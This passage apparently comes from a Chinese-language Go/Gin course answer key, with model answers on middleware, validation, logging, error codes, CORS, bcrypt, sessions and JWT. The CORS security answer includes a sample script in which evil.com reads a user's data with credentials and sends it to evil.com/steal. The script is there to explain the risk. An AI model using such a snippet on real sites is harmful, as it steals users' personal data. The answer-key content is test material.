  为什么要注意？→ `c.Next()` 之前的代码在请求进入时执行，之后的代码在响应返回时执行。测量耗时必须在 `c.Next()` 前后分别记录时间。

---

### K-69-2 限流中间件

**标准答案**：
```go
import "golang.org/x/time/rate"

func RateLimitMiddleware(r rate.Limit, b int) gin.HandlerFunc {
    limiter := rate.NewLimiter(r, b)

    return func(c *gin.Context) {
        if !limiter.Allow() {
            c.AbortWithStatusJSON(http.StatusTooManyRequests, gin.H{
                "code":    429,
                "message": "too many requests",
            })
            return
        }
        c.Next()
    }
}

func main() {
    r := gin.Default()
    r.Use(RateLimitMiddleware(50, 50)) // 50 req/s, burst=50
    // ... 路由
    r.Run(":8080")
}
```

测试：
```bash
# 用 ab 或 wrk 压测
# ab -n 100 -c 10 http://localhost:8080/ping
# 期望：约 50 个成功，50 个返回 429
```

**解析**：
- `rate.NewLimiter(50, 50)`：每秒 50 个令牌，桶容量 50。
- `c.AbortWithStatusJSON`：终止请求，不调用后续中间件和 handler。
- 限流是架构级防护，放在中间件链的最前面（日志之后），避免无效请求消耗后续资源。

**改值实验**：
- **把 `rate.NewLimiter(50, 50)` 改成 `rate.NewLimiter(50, 1)`**：burst 从 50 降到 1。在页面同时加载 10 个资源时，只有 1 个能通过，其余 9 个被限流。
  为什么要注意？→ burst 太小会导致正常使用的批量请求也被拒绝。burst 应该至少覆盖一个页面加载的请求数。

---

### K-69-3 中间件链执行顺序 ⭐

**标准答案**：

**洋葱模型**：
```
请求 →
┌──────────────────────────────┐
│  D (Recovery)                │
│  ┌────────────────────────┐  │
│  │  B (Auth)              │  │
│  │  ┌──────────────────┐  │  │
│  │  │  C (RateLimit)   │  │  │
│  │  │  ┌────────────┐  │  │  │
│  │  │  │  Handler   │  │  │  │
│  │  │  └────────────┘  │  │  │
│  │  └──────────────────┘  │  │
│  └────────────────────────┘  │
└──────────────────────────────┘
→ 响应
```

**推荐注册顺序**：
```go
r.Use(
    D_Recovery,    // 最外层：捕获所有 panic
    A_Logger,      // 记录所有请求（包括被拒绝的）
    C_RateLimit,   // 限流：拒绝无效请求
    B_Auth,        // 认证：验证身份
)
```

理由：
1. **Recovery 最外层**：任何中间件的 panic 都能被捕获。
2. **Logger 紧随其后**：记录所有请求，包括被限流/认证拒绝的。
3. **RateLimit 在 Auth 之前**：被限流的请求不需要做认证（节省资源），也不应让攻击者通过认证探测来绕过限流。
4. **Auth 在业务 Handler 之前、限流之后**：先判断是否超限，再判断身份。

**如果 C 拒绝请求，A 是否还会记录日志？**
会的。当 C（限流）调用 `c.AbortWithStatusJSON()` 时，控制权回到 C 的调用者 B，B 看到 `c.IsAborted()`，不再调用下一个中间件，直接返回。B 返回到 A，A 执行 `c.Next()` 之后的日志记录逻辑。

```go
func A_Logger(c *gin.Context) {
    start := time.Now()
    c.Next()                          // ← C 通过 Abort 返回后，从这继续
    log.Printf("status=%d", c.Writer.Status()) // ← 记录 429
}
```

**换个角度想**：`Abort()` 不跳过当前中间件的后续代码——它只是阻止继续向内层调用。外层中间件在 `c.Next()` 之后的代码仍然会执行。这就是为什么 Logger 在限流后面注册，但仍然能记录被限流的请求。

---

## 第70章 · Gin 响应

### K-70-1 统一响应格式封装

**标准答案**：
```go
package response

import (
    "net/http"

    "github.com/gin-gonic/gin"
    "github.com/google/uuid"
)

type Response struct {
    Code      int         `json:"code"`
    Message   string      `json:"message"`
    Data      interface{} `json:"data,omitempty"`
    RequestID string      `json:"request_id"`
}

func Success(c *gin.Context, data interface{}) {
    c.JSON(http.StatusOK, Response{
        Code:      0,
        Message:   "success",
        Data:      data,
        RequestID: getRequestID(c),
    })
}

func Error(c *gin.Context, code int, message string) {
    c.JSON(http.StatusOK, Response{ // HTTP 200, 业务码区分
        Code:      code,
        Message:   message,
        RequestID: getRequestID(c),
    })
}

func ErrorWithStatus(c *gin.Context, httpStatus int, code int, message string) {
    c.JSON(httpStatus, Response{
        Code:      code,
        Message:   message,
        RequestID: getRequestID(c),
    })
}

func getRequestID(c *gin.Context) string {
    if id := c.GetString("request_id"); id != "" {
        return id
    }
    return uuid.New().String()
}
```

**中间件注入 request_id**：
```go
func RequestIDMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        id := c.GetHeader("X-Request-ID")
        if id == "" {
            id = uuid.New().String()
        }
        c.Set("request_id", id)
        c.Header("X-Request-ID", id)
        c.Next()
    }
}
```

**解析**：
- 业务错误码和 HTTP 状态码分离：`Error` 返回 HTTP 200 + 非 0 的业务码，`ErrorWithStatus` 允许覆盖 HTTP 状态码。
- `json:"data,omitempty"`：data 为空时不输出，避免 `"data": null`。
- `c.Set` / `c.GetString`：在请求上下文中传递 request_id。

**改值实验**：
- **把所有 Error 的 HTTP 状态码都改成 200**：浏览器/代理/CDN 无法区分成功和错误（都会缓存），监控系统无法通过 HTTP status 统计错误率。
  为什么要注意？→ 即使业务码在 JSON body 中，HTTP 状态码仍然是 HTTP 层面的重要信号。建议至少区分 2xx（成功）、4xx（客户端错误）、5xx（服务端错误）。

---

### K-70-2 响应格式版本兼容 ⭐

**标准答案**：

**方案：请求头版本协商 + 响应适配层**

```go
func ResponseAdapter() gin.HandlerFunc {
    return func(c *gin.Context) {
        apiVersion := c.GetHeader("X-API-Version")
        if apiVersion == "" {
            apiVersion = "v1" // 默认 v1
        }
        c.Set("api_version", apiVersion)

        // 包装 Writer，拦截响应
        c.Writer = &responseWriter{c.Writer, apiVersion, c}
        c.Next()
    }
}

type responseWriter struct {
    gin.ResponseWriter
    version string
    ctx     *gin.Context
}

func (w *responseWriter) WriteJSON(obj interface{}) {
    if w.version == "v1" {
        // 将 v2 的 {code, message, data} 转为 v1 的 {data, msg}
        if resp, ok := obj.(Response); ok {
            v1Resp := map[string]interface{}{
                "data": resp.Data,
                "msg":  resp.Message,
            }
            w.ResponseWriter.WriteJSON(v1Resp)
            return
        }
    }
    w.ResponseWriter.WriteJSON(obj)
}
```

**更简单的方案：双路由组**
```go
v1 := r.Group("/api/v1")
v1.GET("/articles", handlerV1)

v2 := r.Group("/api/v2")
v2.GET("/articles", handlerV2)
```

**换个角度想**：版本兼容没有银弹。URL 版本简单粗暴但有效；响应适配层优雅但维护成本高；GraphQL 通过字段演进从根本上解决了版本问题。选择方案时优先考虑团队能力和维护成本。对小团队，双路由组最实在。

---

## 第71章 · 参数校验

### K-71-1 自定义校验规则

**标准答案**：
```go
package main

import (
    "regexp"
    "unicode"

    "github.com/gin-gonic/gin"
    "github.com/gin-gonic/gin/binding"
    "github.com/go-playground/validator/v10"
)

func init() {
    if v, ok := binding.Validator.Engine().(*validator.Validate); ok {
        v.RegisterValidation("password_strength", validatePasswordStrength)
        v.RegisterValidation("phone_cn", validatePhoneCN)
    }
}

func validatePasswordStrength(fl validator.FieldLevel) bool {
    password := fl.Field().String()
    var hasUpper, hasLower, hasDigit bool
    for _, r := range password {
        switch {
        case unicode.IsUpper(r):
            hasUpper = true
        case unicode.IsLower(r):
            hasLower = true
        case unicode.IsDigit(r):
            hasDigit = true
        }
    }
    return hasUpper && hasLower && hasDigit
}

func validatePhoneCN(fl validator.FieldLevel) bool {
    phone := fl.Field().String()
    matched, _ := regexp.MatchString(`^1[3-9]\d{9}$`, phone)
    return matched
}

type RegisterReq struct {
    Username string `validate:"required,min=3,max=20,alphanum"`
    Password string `validate:"required,min=8,password_strength"`
    Phone    string `validate:"required,phone_cn"`
    Age      int    `validate:"gte=0,lte=150"`
    Email    string `validate:"required,email"`
}

func main() {
    r := gin.Default()
    r.POST("/register", func(c *gin.Context) {
        var req RegisterReq
        if err := c.ShouldBindJSON(&req); err != nil {
            c.JSON(400, gin.H{"error": err.Error()})
            return
        }
        c.JSON(200, gin.H{"message": "ok"})
    })
    r.Run(":8080")
}
```

**改值实验**：
- **把手机号正则 `^1[3-9]\d{9}$` 改成 `^1\d{10}$`**：允许 `12xxxxx` 等不存在的号段。虽然短期内没问题，但未来发送短信时会对无效号段浪费费用。
  为什么要注意？→ 正则的精度决定了校验的有效性。太松 = 无效数据入库；太紧 = 合法用户被挡（如新号段 19x）。
  理解什么？→ 手机号校验要考虑号段演进。只校验格式（`^1\d{10}$`）比校验号段更稳健，真正的有效性由短信验证码保证。

---

### K-71-2 多语言校验错误 ⭐

**标准答案**：
```go
var messages = map[string]map[string]string{
    "zh": {
        "Username.required":           "用户名不能为空",
        "Username.min":                "用户名长度不能少于3个字符",
        "Password.password_strength":  "密码必须包含大写、小写和数字",
        "Phone.phone_cn":              "手机号格式不正确",
    },
    "en": {
        "Username.required":           "Username is required",
        "Username.min":                "Username must be at least 3 characters",
        "Password.password_strength":  "Password must contain uppercase, lowercase and digit",
        "Phone.phone_cn":              "Invalid phone number format",
    },
}

func translateError(err error, lang string) string {
    verrs, ok := err.(validator.ValidationErrors)
    if !ok {
        return err.Error()
    }

    msgs := messages["en"]
    if langMsgs, exists := messages[lang]; exists {
        msgs = langMsgs
    }

    for _, e := range verrs {
        key := e.Field() + "." + e.Tag()
        if msg, exists := msgs[key]; exists {
            return msg
        }
    }
    return "Validation failed"
}

func ValidateMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Next() // 等 handler 执行完

        if len(c.Errors) > 0 {
            lang := c.GetHeader("Accept-Language")
            if lang == "" || (lang != "zh-CN" && lang != "en-US") {
                lang = "en"
            } else {
                lang = lang[:2] // "zh-CN" → "zh"
            }
            for _, e := range c.Errors {
                e.Meta = translateError(e.Err, lang)
            }
        }
    }
}
```

**换个角度想**：校验错误的多语言本质上是一个 key→message 的映射表。更高级的方案是使用 `go-i18n` 库，将翻译文本外置到 JSON/YAML 文件中，方便非技术人员维护翻译。同时考虑复用 validator 的 `RegisterTranslation` 方法。

---

## 第72章 · 项目结构

### K-72-1 搭建标准三层架构骨架

**标准答案**：

```
project/
├── cmd/server/main.go
├── internal/
│   ├── handler/user_handler.go
│   ├── service/user_service.go
│   ├── repository/user_repository.go
│   ├── model/user.go
│   ├── middleware/logger.go
│   └── router/router.go
├── pkg/
│   ├── response/response.go
│   └── errcode/errcode.go
├── config/config.yaml
├── go.mod
└── Makefile
```

**核心文件示例**：

`internal/model/user.go`：
```go
package model

import "time"

type User struct {
    ID        int64     `gorm:"primaryKey" json:"id"`
    Username  string    `gorm:"size:50;not null" json:"username"`
    Email     string    `gorm:"size:100;unique" json:"email"`
    CreatedAt time.Time `json:"created_at"`
}
```

`internal/repository/user_repository.go`：
```go
package repository

import (
    "project/internal/model"
    "gorm.io/gorm"
)

type UserRepository struct {
    db *gorm.DB
}

func NewUserRepository(db *gorm.DB) *UserRepository {
    return &UserRepository{db: db}
}

func (r *UserRepository) FindByID(id int64) (*model.User, error) {
    var user model.User
    err := r.db.First(&user, id).Error
    return &user, err
}
```

`internal/service/user_service.go`：
```go
package service

import "project/internal/repository"

type UserService struct {
    repo *repository.UserRepository
}

func NewUserService(repo *repository.UserRepository) *UserService {
    return &UserService{repo: repo}
}
```

`internal/handler/user_handler.go`：
```go
package handler

import (
    "project/internal/service"
    "project/pkg/response"
    "github.com/gin-gonic/gin"
)

type UserHandler struct {
    svc *service.UserService
}

func NewUserHandler(svc *service.UserService) *UserHandler {
    return &UserHandler{svc: svc}
}

func (h *UserHandler) GetUser(c *gin.Context) {
    // ...
    response.Success(c, user)
}
```

`cmd/server/main.go`：
```go
package main

import (
    "project/internal/handler"
    "project/internal/repository"
    "project/internal/service"
    "project/internal/router"
    "gorm.io/driver/mysql"
    "gorm.io/gorm"
)

func main() {
    db, _ := gorm.Open(mysql.Open("dsn..."), &gorm.Config{})

    userRepo := repository.NewUserRepository(db)
    userSvc := service.NewUserService(userRepo)
    userH := handler.NewUserHandler(userSvc)

    r := router.Setup(userH)
    r.Run(":8080")
}
```

**换个角度想**：三层架构不是银弹。当你的应用只有 3 个接口时，三层架构是过度设计；当你的应用有 50 个接口时，三层架构能救命。模式的选择取决于复杂度，不要为了"标准"而过度设计。

---

### K-72-2 依赖注入实践 ⭐

**标准答案**：

`wire.go`：
```go
//go:build wireinject
// +build wireinject

package main

import (
    "project/internal/handler"
    "project/internal/repository"
    "project/internal/service"
    "github.com/google/wire"
    "gorm.io/gorm"
)

func InitUserHandler(db *gorm.DB) *handler.UserHandler {
    wire.Build(
        repository.NewUserRepository,
        service.NewUserService,
        handler.NewUserHandler,
    )
    return &handler.UserHandler{}
}
```

`wire_gen.go`（生成后）：
```go
func InitUserHandler(db *gorm.DB) *handler.UserHandler {
    userRepository := repository.NewUserRepository(db)
    userService := service.NewUserService(userRepository)
    userHandler := handler.NewUserHandler(userService)
    return userHandler
}
```

`main.go`：
```go
func main() {
    db, _ := gorm.Open(mysql.Open("dsn..."), &gorm.Config{})
    userHandler := InitUserHandler(db)
    r := router.Setup(userHandler)
    r.Run(":8080")
}
```

生成命令：`wire ./cmd/server/`

**换个角度想**：Wire 是编译时 DI，不同于运行时 DI（如 dig）。编译时 DI 的优势是：依赖图错误在编译期暴露，没有运行时反射开销，代码可读可追踪。代价是每次新增依赖需要重新 `wire` 生成。

---

## 第73章 · 日志

### K-73-1 结构化日志配置

**标准答案**：
```go
package logger

import (
    "os"
    "go.uber.org/zap"
    "go.uber.org/zap/zapcore"
    "gopkg.in/natefinch/lumberjack.v2"
)

func NewLogger(env string) *zap.Logger {
    var config zap.Config

    if env == "production" {
        config = zap.NewProductionConfig()
        config.Level = zap.NewAtomicLevelAt(zap.InfoLevel)
        config.EncoderConfig.TimeKey = "timestamp"
        config.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder

        // 输出到文件 + 按天切割
        writer := &lumberjack.Logger{
            Filename:   "logs/app.log",
            MaxSize:    100, // MB
            MaxBackups: 30,
            MaxAge:     7,   // 天
            Compress:   true,
        }
        // 自定义 core 同时输出到文件和 stdout
        fileWriter := zapcore.AddSync(writer)
        consoleWriter := zapcore.AddSync(os.Stdout)
        encoder := zapcore.NewJSONEncoder(config.EncoderConfig)
        core := zapcore.NewTee(
            zapcore.NewCore(encoder, fileWriter, config.Level),
            zapcore.NewCore(encoder, consoleWriter, config.Level),
        )
        return zap.New(core, zap.Fields(
            zap.String("service_name", "myapp"),
            zap.String("version", "1.0.0"),
        ))
    }

    // 开发环境
    config = zap.NewDevelopmentConfig()
    config.Level = zap.NewAtomicLevelAt(zap.DebugLevel)
    config.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
    logger, _ := config.Build(zap.Fields(
        zap.String("service_name", "myapp"),
        zap.String("version", "1.0.0"),
    ))
    return logger
}
```

**改值实验**：
- **把生产环境的 Level 从 Info 改成 Debug**：每条请求都会输出大量调试日志（SQL 语句、参数绑定等），日志量可能翻 10 倍以上，磁盘 IO 成为瓶颈。
  为什么要注意？→ 日志级别直接影响性能和存储成本。生产环境用 Info/Warn/Error，Debug 仅开发环境。

---

### K-73-2 链路追踪日志 ⭐

**标准答案**：

```go
package middleware

import (
    "context"
    "github.com/gin-gonic/gin"
    "github.com/google/uuid"
    "go.uber.org/zap"
)

type contextKey string
const TraceIDKey contextKey = "trace_id"

func TraceMiddleware(logger *zap.Logger) gin.HandlerFunc {
    return func(c *gin.Context) {
        traceID := c.GetHeader("X-Trace-ID")
        if traceID == "" {
            traceID = uuid.New().String()
        }

        // 注入 context
        ctx := context.WithValue(c.Request.Context(), TraceIDKey, traceID)
        c.Request = c.Request.WithContext(ctx)

        // 注入 Gin context
        c.Set("trace_id", traceID)
        c.Header("X-Trace-ID", traceID)

        // 将带 trace_id 的 logger 注入 context
        traceLogger := logger.With(zap.String("trace_id", traceID))
        c.Set("logger", traceLogger)

        c.Next()
    }
}

func GetTraceID(ctx context.Context) string {
    if id, ok := ctx.Value(TraceIDKey).(string); ok {
        return id
    }
    return ""
}

// 使用示例
func (h *UserHandler) GetUser(c *gin.Context) {
    logger := c.MustGet("logger").(*zap.Logger)
    logger.Info("querying user", zap.String("user_id", c.Param("id")))
    // 此日志自动携带 trace_id
}
```

**换个角度想**：链路追踪的核心是将一个请求的所有日志串联起来。最简单的是 trace_id 透传；完整的方案是 OpenTelemetry（trace_id + span_id + 采样策略）。当前手工注入方案适合中小项目。

---

## 第74章 · 错误码

### K-74-1 统一错误码体系设计

**标准答案**：

```go
package errcode

import "fmt"

type ErrorCode struct {
    Code    int
    HTTP    int
    MsgZH   string
    MsgEN   string
}

func (e ErrorCode) Error() string {
    return fmt.Sprintf("[%d] %s", e.Code, e.MsgEN)
}

var (
    // 通用错误 10000~19999
    ErrSuccess       = ErrorCode{0, 200, "成功", "success"}
    ErrInternal      = ErrorCode{10001, 500, "服务器内部错误", "internal server error"}
    ErrInvalidParam  = ErrorCode{10002, 400, "参数无效", "invalid parameter"}
    ErrUnauthorized  = ErrorCode{10003, 401, "未授权", "unauthorized"}
    ErrForbidden     = ErrorCode{10004, 403, "无权限", "forbidden"}
    ErrNotFound      = ErrorCode{10005, 404, "资源不存在", "not found"}
    ErrRateLimit     = ErrorCode{10006, 429, "请求过于频繁", "rate limit exceeded"}

    // 用户相关 20000~29999
    ErrUserExists      = ErrorCode{20001, 409, "用户已存在", "user already exists"}
    ErrUserNotFound    = ErrorCode{20002, 404, "用户不存在", "user not found"}
    ErrPasswordWrong   = ErrorCode{20003, 401, "密码错误", "wrong password"}
    ErrTokenExpired    = ErrorCode{20004, 401, "令牌已过期", "token expired"}
    ErrTokenInvalid    = ErrorCode{20005, 401, "令牌无效", "invalid token"}

    // 文章相关 30000~39999
    ErrArticleNotFound = ErrorCode{30001, 404, "文章不存在", "article not found"}
    ErrArticleForbid   = ErrorCode{30002, 403, "无权操作此文章", "no permission on article"}
)
```

**解析**：
- 错误码分段管理：10000 通用、20000 用户、30000 文章，便于快速定位问题模块。
- 同时携带 HTTP 状态码和业务消息，handler 层可直接使用。
- 实现了 `Error()` 接口，可以作为 error 返回。

**改值实验**：
- **把错误码从 20001 改成 10001**：用户已存在和服务器内部错误共用一个码，日志分析无法区分是业务错误还是系统错误。
  为什么要注意？→ 错误码分段决定了监控的粒度。同一个码不要在不同语义间复用。

---

### K-74-2 错误码与 i18n ⭐

**标准答案**：

```go
func (e ErrorCode) Message(lang string) string {
    switch lang {
    case "zh", "zh-CN":
        return e.MsgZH
    default:
        return e.MsgEN
    }
}

func GetLang(c *gin.Context) string {
    lang := c.GetHeader("Accept-Language")
    if strings.HasPrefix(lang, "zh") {
        return "zh"
    }
    return "en"
}

// handler 中使用
func SomeHandler(c *gin.Context) {
    lang := GetLang(c)
    err := errcode.ErrUserNotFound
    response.Error(c, err.Code, err.Message(lang))
}
```

**换个角度想**：简单的 i18n 可以用 switch/map 解决。当错误码超过 50 个、支持语言超过 5 种时，建议使用 `go-i18n` 或 `go-i18n/v2` 将翻译外置到 JSON/YAML 文件。

---

## 第75章 · Swagger

### K-75-1 API 文档生成

**标准答案**：

`main.go` 添加注解：
```go
// @title           Blog API
// @version         1.0
// @description     博客系统 API 文档
// @host            localhost:8080
// @BasePath        /api/v1
func main() {
    r := gin.Default()
    r.GET("/swagger/*any", ginSwagger.WrapHandler(swaggerFiles.Handler))

    v1 := r.Group("/api/v1")
    {
        v1.GET("/articles", ListArticles)
        v1.POST("/articles", CreateArticle)
        v1.GET("/articles/:id", GetArticle)
        v1.PUT("/articles/:id", UpdateArticle)
        v1.DELETE("/articles/:id", DeleteArticle)
    }
    r.Run(":8080")
}

// @Summary      获取文章列表
// @Tags         文章
// @Param        page  query  int  false  "页码"  default(1)
// @Param        size  query  int  false  "每页数量"  default(10)
// @Success      200   {object}  response.Response
// @Router       /articles [get]
func ListArticles(c *gin.Context) { /* ... */ }

// @Summary      创建文章
// @Tags         文章
// @Accept       json
// @Produce      json
// @Param        body  body  CreateArticleReq  true  "文章信息"
// @Success      201   {object}  response.Response
// @Router       /articles [post]
func CreateArticle(c *gin.Context) { /* ... */ }
```

生成命令：`swag init -g cmd/server/main.go`

**改值实验**：
- **忘记写 `@Param` 注解**：Swagger UI 中该接口没有参数输入框，调用方需要猜测参数名和类型。
  为什么要注意？→ Swagger 注解的完整度直接决定文档的可用性。缺少注解的接口在前端眼中"不存在"。

---

### K-75-2 Swagger + 自动化 ⭐

**标准答案**：

`Makefile`：
```makefile
.PHONY: swagger
swagger:
	swag init -g cmd/server/main.go -o ./docs

.PHONY: swagger-check
swagger-check:
	swag init -g cmd/server/main.go -o ./docs
	@if [ -n "$$(git diff --name-only docs/)" ]; then \
		echo "ERROR: Swagger docs are out of date. Run 'make swagger' and commit."; \
		git diff docs/; \
		exit 1; \
	fi
```

CI 配置（GitHub Actions 片段）：
```yaml
- name: Check swagger docs
  run: make swagger-check
```

**换个角度想**：将 `swagger-check` 放入 CI，确保每次 PR 的 API 文档和代码同步。不一致时 CI 报错，强迫开发者更新文档。这是 API 文档不被腐烂的唯一办法。

---

## 第76章 · CORS

### K-76-1 跨域配置

**标准答案**：

```go
import (
    "time"
    "github.com/gin-contrib/cors"
    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()

    r.Use(cors.New(cors.Config{
        AllowOrigins:     []string{"http://localhost:3000", "https://yourdomain.com"},
        AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
        AllowHeaders:     []string{"Origin", "Content-Type", "Authorization"},
        AllowCredentials: true,
        MaxAge:           12 * time.Hour,
    }))

    r.Run(":8080")
}
```

**解析**：
- `AllowCredentials: true`：允许携带 Cookie/Authorization 头，前提是 `AllowOrigins` 不能是 `*`。
- `MaxAge`：浏览器缓存预检（OPTIONS）结果的时间，减少预检请求。
- `OPTIONS` 方法必须明确列出，否则浏览器预检请求会失败。

**改值实验**：
- **把 `AllowOrigins` 改成 `["*"]` 同时 `AllowCredentials: true`**：浏览器控制台报错——CORS 规范禁止 credentials 与 `*` 同时使用。
  为什么要注意？→ 这是 CORS 的硬性约束。要么指定明确域名 + credentials，要么用 `*` 但禁止 credentials。

---

### K-76-2 CORS 安全分析 ⭐

**标准答案**：

**安全风险**：
配置 `AllowOrigins: ["*"]` 且 `AllowCredentials: true` 实际上被浏览器**直接拒绝**（违反 CORS 规范），但如果服务端没有正确处理：

1. **CSRF 放大**：任何网站都能向你的 API 发请求并携带用户 Cookie
2. **数据泄露**：恶意网站通过 XHR/fetch 读取 API 响应
3. **攻击示例**：
```javascript
// 恶意网站 evil.com 的代码
fetch('https://your-api.com/api/v1/users/me', {
    credentials: 'include'  // 携带用户的 Cookie
})
.then(res => res.json())
.then(data => {
    // 偷走了用户的个人信息！
    fetch('https://evil.com/steal', {method:'POST', body: JSON.stringify(data)})
});
```

**正确配置**：
```go
AllowOrigins: []string{"https://your-frontend.com"},
AllowCredentials: true,
```

**换个角度想**：CORS 不是安全机制——它是「放宽同源策略」的机制。真正的安全在于：永远不要用 `*` + credentials，永远明确列出可信域名。

---

## 第77章 · 认证基础

### K-77-1 bcrypt 密码哈希

**标准答案**：

```go
package auth

import (
    "time"
    "golang.org/x/crypto/bcrypt"
)

func HashPassword(password string) (string, error) {
    bytes, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
    return string(bytes), err
}

func CheckPassword(hashed, password string) bool {
    err := bcrypt.CompareHashAndPassword([]byte(hashed), []byte(password))
    return err == nil
}

// 测试
func TestBcrypt(t *testing.T) {
    pwd := "myPassword123"

    h1, _ := HashPassword(pwd)
    h2, _ := HashPassword(pwd)
    // h1 != h2（盐不同）
    assert.NotEqual(t, h1, h2)
    // 但都能验证通过
    assert.True(t, CheckPassword(h1, pwd))
    assert.True(t, CheckPassword(h2, pwd))
    // 错误密码验证失败
    assert.False(t, CheckPassword(h1, "wrong"))

    // Cost 性能测试
    start := time.Now()
    bcrypt.GenerateFromPassword([]byte(pwd), 10)  // cost=10
    fmt.Println("cost=10:", time.Since(start))

    start = time.Now()
    bcrypt.GenerateFromPassword([]byte(pwd), 14)  // cost=14
    fmt.Println("cost=14:", time.Since(start))
    // cost=14 耗时约是 cost=10 的 16 倍（2^4）
}
```

**解析**：
- bcrypt 自动生成随机盐并嵌入哈希结果中，所以同一密码两次哈希结果不同。
- `DefaultCost = 10`，每增加 1，计算耗时翻倍。cost=10 约 100ms，cost=14 约 1.6s。
- bcrypt 天然防止彩虹表攻击（有盐）和暴力破解（慢哈希）。

**改值实验**：
- **把 cost 从 10 改成 4**：哈希速度快很多，但暴力破解也快很多（约 1ms vs 100ms）。cost=4 下攻击者每秒可尝试约 1000 次，cost=10 约 10 次。
  为什么要注意？→ cost 的选择是一个安全与性能的权衡。用户可以接受 100ms 的登录等待，但攻击者的暴力破解成本从"几乎不可能"变成了"几天就能跑完"。

---

### K-77-2 密码策略校验 ⭐

**标准答案**：

```go
package auth

import (
    "bufio"
    "errors"
    "os"
    "unicode"
)

var ErrWeakPassword = errors.New("password does not meet strength requirements")
var ErrCommonPassword = errors.New("password is too common")

type PasswordValidator struct {
    commonPasswords map[string]bool
}

func NewPasswordValidator(blacklistPath string) (*PasswordValidator, error) {
    pv := &PasswordValidator{commonPasswords: make(map[string]bool)}
    f, err := os.Open(blacklistPath)
    if err != nil {
        return nil, err
    }
    defer f.Close()
    scanner := bufio.NewScanner(f)
    for scanner.Scan() {
        pv.commonPasswords[scanner.Text()] = true
    }
    return pv, nil
}

func (pv *PasswordValidator) Validate(password string) error {
    if len(password) < 8 || len(password) > 128 {
        return errors.New("password must be 8-128 characters")
    }

    var hasUpper, hasLower, hasDigit, hasSpecial bool
    categories := 0
    for _, r := range password {
        switch {
        case unicode.IsUpper(r):
            hasUpper = true
        case unicode.IsLower(r):
            hasLower = true
        case unicode.IsDigit(r):
            hasDigit = true
        case unicode.IsPunct(r) || unicode.IsSymbol(r):
            hasSpecial = true
        }
    }
    if hasUpper { categories++ }
    if hasLower { categories++ }
    if hasDigit { categories++ }
    if hasSpecial { categories++ }
    if categories < 3 {
        return errors.New("password must contain at least 3 of: uppercase, lowercase, digit, special character")
    }

    if pv.commonPasswords[password] {
        return ErrCommonPassword
    }
    return nil
}
```

黑名单文件 `common_passwords.txt`：
```
password123
admin123
12345678
qwerty123
letmein123
...
```

**换个角度想**：密码策略的强度的本质是增加攻击成本。长度限制防止哈希 DoS（128 字符以上 bcrypt 会很慢），字符类别防止纯数字密码，黑名单防止社工。但这还不够——真正的密码安全还需要 MFA（多因素认证）。

---

## 第78章 · Session 认证

### K-78-1 Session 认证实现

**标准答案**：

```go
package auth

import (
    "crypto/rand"
    "encoding/hex"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
    "github.com/redis/go-redis/v9"
)

func LoginHandler(c *gin.Context) {
    var req struct {
        Username string `json:"username"`
        Password string `json:"password"`
    }
    c.ShouldBindJSON(&req)

    user, err := ValidateUser(req.Username, req.Password)
    if err != nil {
        c.JSON(401, gin.H{"error": "invalid credentials"})
        return
    }

    sessionID := generateSessionID()
    userData, _ := json.Marshal(user)

    rdb.Set(c, "session:"+sessionID, userData, 24*time.Hour)

    c.SetCookie("session_id", sessionID, 86400, "/", "", false, true)
    c.JSON(200, gin.H{"message": "login success"})
}

func AuthMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        sessionID, err := c.Cookie("session_id")
        if err != nil {
            c.AbortWithStatusJSON(401, gin.H{"error": "unauthorized"})
            return
        }

        userData, err := rdb.Get(c, "session:"+sessionID).Bytes()
        if err != nil {
            c.AbortWithStatusJSON(401, gin.H{"error": "session expired"})
            return
        }

        var user User
        json.Unmarshal(userData, &user)
        c.Set("user", &user)
        c.Next()
    }
}

func LogoutHandler(c *gin.Context) {
    sessionID, _ := c.Cookie("session_id")
    rdb.Del(c, "session:"+sessionID)
    c.SetCookie("session_id", "", -1, "/", "", false, true)
    c.JSON(200, gin.H{"message": "logged out"})
}

func generateSessionID() string {
    b := make([]byte, 32)
    rand.Read(b)
    return hex.EncodeToString(b)
}
```

**改值实验**：
- **把 session TTL 从 24h 改成 5m**：用户 5 分钟后自动登出，体验极差。合理设置：金融类 15-30min，普通网站 24h-7d。
  为什么要注意？→ Session 过期时间 = 安全 vs 体验的权衡。太短则频繁登录，太长则 session 泄漏风险高。

---

### K-78-2 Session 安全加固 ⭐

**标准答案**：

```go
// 1. 登录后生成新 session_id（防 Session Fixation）
func LoginHandler(c *gin.Context) {
    // ... 验证用户 ...
    oldSessionID, _ := c.Cookie("session_id")
    if oldSessionID != "" {
        rdb.Del(c, "session:"+oldSessionID)  // 删除旧 session
    }
    newSessionID := generateSessionID()
    rdb.Set(c, "session:"+newSessionID, userData, 24*time.Hour)
    c.SetCookie("session_id", newSessionID, 86400, "/", "", true, true)
    // SameSite=Lax, HttpOnly=true, Secure=true
}

// 2. 敏感操作二次验证
func ChangePasswordHandler(c *gin.Context) {
    user := c.MustGet("user").(*User)
    // 验证是否在 5 分钟内通过二次认证
    lastAuth, _ := rdb.Get(c, "reauth:"+user.ID).Result()
    if lastAuth == "" {
        c.JSON(403, gin.H{"error": "请先完成二次身份验证"})
        return
    }
    // ... 修改密码 ...
}

// 3. Cookie 安全属性
func SetSecureCookie(c *gin.Context, name, value string, maxAge int) {
    c.SetCookie(name, value, maxAge, "/", "", true, true)
    // Secure=true, HttpOnly=true, SameSite=Lax（Gin 默认）
}
```

**换个角度想**：Session Fixation 攻击：攻击者先获取一个 session_id，诱导用户用这个 session_id 登录，然后攻击者就可以用这个 session_id 操作用户账户。登录后换 session_id 是标准防御。

---

## 第79章 · JWT

### K-79-1 JWT 签发与验证

**标准答案**：

```go
package auth

import (
    "time"
    "github.com/golang-jwt/jwt/v5"
)

var jwtSecret = []byte("your-secret-key-change-in-production")

type Claims struct {
    UserID   int64  `json:"user_id"`
    Username string `json:"username"`
    jwt.RegisteredClaims
}

func GenerateToken(userID int64, username string) (string, string, error) {
    now := time.Now()

    accessClaims := Claims{
        UserID:   userID,
        Username: username,
        RegisteredClaims: jwt.RegisteredClaims{
